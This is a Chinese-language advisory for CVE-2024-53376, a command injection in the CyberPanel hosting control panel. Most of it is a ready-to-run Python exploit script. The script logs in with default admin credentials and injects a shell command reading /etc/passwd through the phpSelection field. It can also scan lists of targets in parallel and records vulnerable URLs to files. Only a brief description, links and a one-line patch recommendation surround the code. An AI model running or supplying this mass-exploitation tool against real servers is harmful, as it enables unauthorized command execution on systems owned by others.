# 漏洞描述
CyberPanel是Usman Nasir个人开发者的一款内置了DNS和电子邮件服务器的虚拟主机控制面板。

CyberPanel 2.3.8之前版本存在安全漏洞。攻击者利用该漏洞登陆后可以通过 phpSelection 字段中的 shell 元字符对 website/submitWebsiteCreation URI 执行任意命令。

# <font style="color:rgb(52, 58, 64);">披露时间</font>
<font style="color:rgb(33, 37, 41);">2024-12-16</font>

# <font style="color:rgb(33, 37, 41);">参考链接</font>
[https://github.com/ThottySploity/CVE-2024-53376](https://github.com/ThottySploity/CVE-2024-53376)

[https://github.com/ThottySploity/CVE-2024-53376/blob/aa306187323bd1127d56803c...](https://github.com/ThottySploity/CVE-2024-53376/blob/aa306187323bd1127d56803cb34cac8820b61484/cyberpanel.py#L70)

[https://thottysploity.github.io/posts/cve-2024-53376](https://thottysploity.github.io/posts/cve-2024-53376)

# py脚本
```python
#coding:utf-8
import argparse
import requests
import re
import time
import random
import base64
import json
import concurrent.futures
import sys
import urllib.parse

# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings()

timeout = 5  # 请求超时时间

def verify(url, proxies={}):
    if not url.startswith(('http://', 'https://')):
        # 如果没有，就添加 'http://'
        url = 'http://' + url
    try:
        token = requests.get(url, verify=False,proxies=proxies,timeout=timeout,allow_redirects=False)
        if token.status_code == 200 and token.headers.get('Set-Cookie') and "csrftoken=" in token.headers.get('Set-Cookie'):
            # print(token.headers.get('Set-Cookie'))
            csrf_token = token.headers.get('Set-Cookie').split(';')[0]
            headers = {
                'Cookie': csrf_token,
                'Accept': 'application/json',
                'X-Csrftoken': csrf_token.replace('csrftoken=', ''),
                'Origin': 'https://localhost:8090',
                'Referer': 'https://localhost:8090/',
                'Connection': 'close'
            }
            data = {
                "username": 'admin',
                "password": '1234567',
                "languageSelection": "english",
            }
            id = requests.post(
                url + "/verifyLogin",
                headers=headers,
                data=json.dumps(data),
                verify=False,timeout=timeout,proxies=proxies
            )
            if id.status_code == 200 and id.headers.get('Set-Cookie') and '; Path=/,' in id.headers.get('Set-Cookie'):
                # print(id.headers.get('Set-Cookie'))
                sessionId = id.headers.get('Set-Cookie').split(';')[1].replace(" Path=/, ", "")
                # print(sessionId)
                if len(sessionId) > 0:
                    print(f"[+] Obtained the following sessionId: {sessionId}")
                    with open('1.txt', 'a') as f:
                        f.write(url + '\n')
                    exploitHeaders = {
                        'Cookie': f'{csrf_token}; django_language=en; {sessionId}',
                        'Accept': 'application/json',
                        'X-Csrftoken': csrf_token.replace('csrftoken=', ''),
                        'Origin': 'https://localhost:8090',
                        'Referer': 'https://localhost:8090/',
                        'Connection': 'close'
                    }
                    exploitPayload = {
                        "package": "Default",
                        "domainName": "cyberpanel.net",
                        "adminEmail": "cyberpanel@gmail.com",
                        "phpSelection": f"PHP 8.0'; cat /etc/passswd; #",
                        "ssl": 0,
                        "websiteOwner": "admin",
                        "dkimCheck": 0,
                        "openBasedir": 0,
                        "mailDomain": 0,
                        "apacheBackend": 0,
                    }
                    exploitRequest = requests.options(url + "/websites/submitWebsiteCreation", headers=exploitHeaders,data=json.dumps(exploitPayload), verify=False,proxies=proxies,timeout=timeout)
                    if exploitRequest.status_code == 200:
                        print('\033[1;31m' + '[+] Success ' + url + '\033[0m')
                        with open('CVE-2024-53376.txt', 'a') as f:
                            f.write(url + '\n')
        else:
            print("[-] No vulnerabilities found")
    except requests.exceptions.RequestException as e:
        print(e)

def pl(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
        return urls
    except Exception as e:
        print(f"[-] Error reading file {filename}: {e}")
        return []

def help():
    # helpinfo = """ """
    # print(helpinfo)
    print("CVE-2024-53376".center(100, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -f --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -p --proxies 代理设置")
    print(f"[+]{sys.argv[0]} -t --thread 线程设置，默认为10")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")
    print("--@ztomato".rjust(100," "))

def main():
    parser = argparse.ArgumentParser(description='@ztomato')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    parser.add_argument('-t','--thread',type=int, help='线程，默认为10')
    parser.add_argument('-p', '--proxies', type=str, help='代理设置，如 http://127.0.0.1:8080')
    args = parser.parse_args()

    proxies = {}
    if args.proxies:
        proxies = {'http': args.proxies, 'https': args.proxies}

    if args.url:
        verify(args.url, proxies={})
    elif args.file:
        urls = pl(args.file)
        if not urls:
            print(f"[-] No valid URLs found in {args.file}")
            return

        thread = 10
        if args.thread:
            thread = args.thread
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            # 使用 executor.map 实现并发调用
            results = list(executor.map(lambda url: verify(url, proxies={}), urls))
            # 可选：打印结果
            # for result in results:
            #     if result and result.get('isVul'):
            #         print(f"[+] Vulnerability confirmed for {result['url']}")
    else:
        help()

if __name__ == '__main__':
    main()
```

# <font style="color:rgb(33, 37, 41);">修复建议</font>
建议您更新当前系统或软件至最新版，完成漏洞的修复。

